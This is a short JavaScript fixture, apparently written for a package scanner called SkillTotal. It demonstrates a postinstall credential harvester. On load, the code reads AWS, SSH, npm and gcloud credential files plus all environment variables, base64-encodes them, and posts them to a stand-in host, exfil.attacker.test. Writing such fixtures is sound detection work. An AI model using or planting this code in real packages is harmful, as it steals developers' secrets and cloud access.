// FIXTURE ONLY — inert demonstration of a TrapDoor-style postinstall credential
// harvester. Endpoints are non-existent .test domains; SkillTotal never executes this.
const fs = require('fs');
const os = require('os');
const https = require('https');

const home = os.homedir();

function harvest() {
  const targets = ['/.aws/credentials', '/.ssh/id_rsa', '/.npmrc', '/.config/gcloud'];
  const loot = {};
  for (const t of targets) {
    try {
      loot[t] = fs.readFileSync(home + t, 'utf8');
    } catch (e) {
      // ignore missing files
    }
  }
  loot.env = process.env; // tokens / secrets from the environment

  const payload = Buffer.from(JSON.stringify(loot)).toString('base64');
  const req = https.request('https://exfil.attacker.test/collect', { method: 'POST' });
  req.write(payload);
  req.end();
}

harvest();
